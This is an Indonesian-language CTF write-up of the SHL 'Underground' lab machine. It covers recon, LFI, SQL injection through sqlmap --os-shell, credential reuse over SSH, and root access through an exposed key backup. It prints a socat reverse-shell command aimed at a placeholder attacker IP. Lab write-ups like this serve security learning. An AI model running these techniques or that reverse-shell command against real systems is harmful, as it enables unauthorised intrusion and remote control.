---
title: "{SHL} Challenge Underground Write Up"
date: 2020-05-21T00:25:20+07:00
tags: [ "Challenge", "SHL"]
draft: true
---

## About Challenge
![](/images/shl/underground/intro.png)

Machine : Underground b0x
Level   : ez to medium
Goal    : root user and read the root.txt



## Reconnaissance & Scanning
Pertama kita akan memulainya dengan melakukan scanning terhadap target menggunakan nmap, dari hasil scanning kita mendapatkan informasi berupa port ataupun service yang berjalan dan dapat diakses dari external network. 

![](/images/shl/underground/1.png)

### Port 80 (HTTP Service)
Nmap memberikan informasi bahwa port port 80 dalam kondisi open, tanpa basa-basi langsung bruteforce directory menggunakan gobuster. 

![](/images/shl/underground/2.png)

Sembari menunggu gobuster berjalan, kita coba-coba secara manual beberapa file yang mungkin dapat bermanfaat, diantaranya :
-   .git/config
-   .svn
-   backup/
-   robots.txt
-   README.md
-   readme.txt

![](/images/shl/underground/3.png)

Ditemukan file readme.txt yang memebrikan informasi bahwa terdapat SVWA (SHL Vulnerability Web App) yang terinstall disana, jujur saya baru tau SHL membuat semacam  BWAPP/DVWA nya gitu. Penasaran dengan SVWA, saya coba search di forum SHL :
![](/images/shl/underground/4.png) 

Ternyata benar adanya, SVWA pernah diposting oleh @lastname dan dipublikasikan  di github miliknya [disini]. Setelah yakin bahwa informasi ini valid, saya coba akses directory /svwa pada target.

![](/images/shl/underground/5.png)
![](/images/shl/underground/6.png)

Yang namanya vulnerable app pasti banyak celahnya, namun dari info yang kita dapatkan tadi beberapa celah sudah ditutup sehingga kita harus mencoba cari lagi celah yang masih bisa dieksploitasi. Setelah mencoba register dan berhasil login,  ditemukan beberapa kemungkinan celah yang terlihat jelas didepan mata :
-   Unrestricted file upload
-   LFI
-   SQL Injection




### Unrestricted file upload

File upload is becoming a more and more essential part of any application, where the user is able to upload their photo, their CV, or a video showcasing a project they are working on. The application should be able to fend off bogus and malicious files in a way to keep the application and the users safe. (OWASP)

![](/images/shl/underground/7.png)
 

Kita coba upload shell, namun nampaknya sudah dipatch oleh admin sehingga kita tidak dapat mengunggah web shell kita, berikut response body ketika kita coba upload file berekstensi php

![](/images/shl/underground/8.png)

### LFI (Local File Inclusion)
Local File Inclusion (LFI) allows an attacker to include files on a server through the web browser. This vulnerability exists when a web application includes a file without correctly sanitising the input, allowing and attacker to manipulate the input and inject path traversal characters and include other files from the web server. (OWASP)

![](/images/shl/underground/9.png)
![](/images/shl/underground/10.png)

Dari celah ini kita dapat melihat file-file yang ada, termasuk file konfigurasi database aplikasi yang berada pada directory db/koneksi.php, walaupun kita belum tau untuk apa nantinya. Seharusnya kita juga bisa memanfaatkan LFI ini untuk gaining acces ke system dengan memanfaatkan access.log nya. ^_^

![](/images/shl/underground/11.png)

### Sql Injection
A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. (OWASP)

![](/images/shl/underground/12.png)

Celah sql injection terjadi di parameter id pada file read.php, jika kita memberikan single quote (‘) pada parameter id maka akan terjadi error, pada kasus ini errornya adalah text post dari id 1 tidak ditampilkan oleh aplikasi.


## Gaining Access

Kita coba untuk gaining access from LFI to RCE memanfaatkan access log yang ada, namun besarnya kapasitas file access.log (efek bruteforce mungkin) membuat saya sedikit frustasi untuk mengaksesnya, lalu saya tinggalkan. 

### Gaining Access Through Sql Injection To RCE
Kita coba untuk gaining access dari celah SQL Injection dengan tools sqlmap –os-shell, dan ternyata gagal mendapatkan shell, rupanya aplikasi ini tidak terdapat pada common document root yang biasa dipakai mwehehe. 

Kenapa kita tidak memanfaatkan celah LFI untuk mencari tahu document root nya saja? Alhasil saya menemukan document root nya di error.log nginx, lalu mengulangi langkah gaining access menggunakan sqlmap dengan custom directory yang telah ditemukan. 

![](/images/shl/underground/13.png)

![](/images/shl/underground/14.png)
Berhasil mendapatkan remote shell via sqlmap –os-shell, dan berhasil membuat webshell minimalis yang lebih indah dilihat daripada os-shell milik sqlmap. 

![](/images/shl/underground/15.png)

### Reverse Shell

Lalu dilakukan percobaan reverse shell, beberapa kali percobaan gagal namun pada akhirnya reverse shell berhasil dilakukan menggunakan socat.

Command : socat tcp-connect:IP Address:Port system:/bin/sh

![](/images/shl/underground/16.png)

![](/images/shl/underground/17.png)

Melihat shell yang digunakan sekarang menunjukkan bahwa kita sedang menggunakan shell nologin yang artinya dia bisa menjalankan shell, tapi tidak dianggap sevagai user login [man nologin]. Kenapa ngga sadar dari tadi pas load /etc/passwd saat percobaan LFI yak? Monmap namanya juga khilaf… rasanya ada yang kurang lengkap jika tidak melakukan backconnect haha...

### Gaining Access Through Database Credential
Melihat proses yang sedang berjalan, menunjukkan bahwa terdapat user human. Wait? Seperti tidak asing, pada celah LFI tadi sempat melihat credential database dengan user human, kenapa tidak coba login ssh menggunakan credential ini saja? Siapa tau beruntung yak an? Untuk memastikan coba kita check sekali lagi file koneksi.php nya

![](/images/shl/underground/18.png)

Mengingat bahwa port 22 (SSH) nya terbuka, kita coba langsung ssh ke system target, namun ternyata akses melalui port 22 ini memerlukan ssh private key. 

![](/images/shl/underground/19.png)

Sedikit perhatian pada port 2222, ternyata ini adalah port SSH yang lain. Dilakukan percobaan login user human menggunakan credential mysql pada port 2222 dan berhasil. 

![](/images/shl/underground/20.png)

![](/images/shl/underground/21.png)

## Privilege Escalation Get Root.txt

Setelah melakukan enumerasi, didapatkan folder rootsshkeybackup yang diduga berisi ssh private key milik user root. Dan benar saja didalamnya terdapat private key dan public key milik user root

![](/images/shl/underground/22.png)

Untung saja file-file ini tidak memiliki permission khusus untuk mengaksesnya, jadi tinggal menggunakan key ini saja untuk login ke user root.

![](/images/shl/underground/23.png) 

Terimakasih sudah membaca :)

## Reference
- [Reverse Shell Cheat Sheet
](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [SQL Injection
](https://owasp.org/www-community/attacks/SQL_Injection)
- [Local File Inclusion (LFI)](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)
- [Unrestricted File Upload
](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
